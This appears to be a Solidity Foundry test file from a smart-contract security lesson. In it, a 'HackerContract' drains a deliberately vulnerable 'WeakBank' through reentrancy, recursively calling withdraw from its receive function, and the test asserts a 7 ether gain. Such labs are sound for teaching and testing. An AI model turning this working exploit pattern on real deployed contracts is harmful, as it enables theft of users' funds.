// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { WeakBank, GoodBank } from "src/Reentrancy.sol";
import { DeployBank } from "script/Reentrancy.s.sol";

// ----------------------------------------------------- //
// ----------------- Exploit Contract ------------------ //
// ----------------------------------------------------- //

contract HackerContract {
    WeakBank _bank;
    constructor(address _WeakBank) {
        _bank = WeakBank(_WeakBank) ;
    }
    function hack() external payable {
        assert(msg.value == 1 ether);
        _bank.deposit{value: 1 ether}();
        _bank.withdraw(1 ether);
    }
    receive() external payable {
        if (address(_bank).balance >= 1 ether) {
            _bank.withdraw(1 ether);
        }
    }        
}

// ----------------------------------------------------- //
// ----------------- Exploit Method -------------------- //
// ----------------------------------------------------- //

contract ExploitWeakBankTest is Test {

    address hacker = makeAddr("hacker");
    WeakBank bank;

    function setUp() public {
        bank = new DeployBank().run();
    }

    function test_exploit_reentrancy() public {
        HackerContract hack = new HackerContract(address(bank));
        assertEq(address(hack).balance, 0 ether);

        vm.deal(hacker, 1 ether);
        vm.prank(hacker);
        hack.hack{value: 1 ether}();
        
        assertEq(address(hack).balance, 7 ether);
    }

}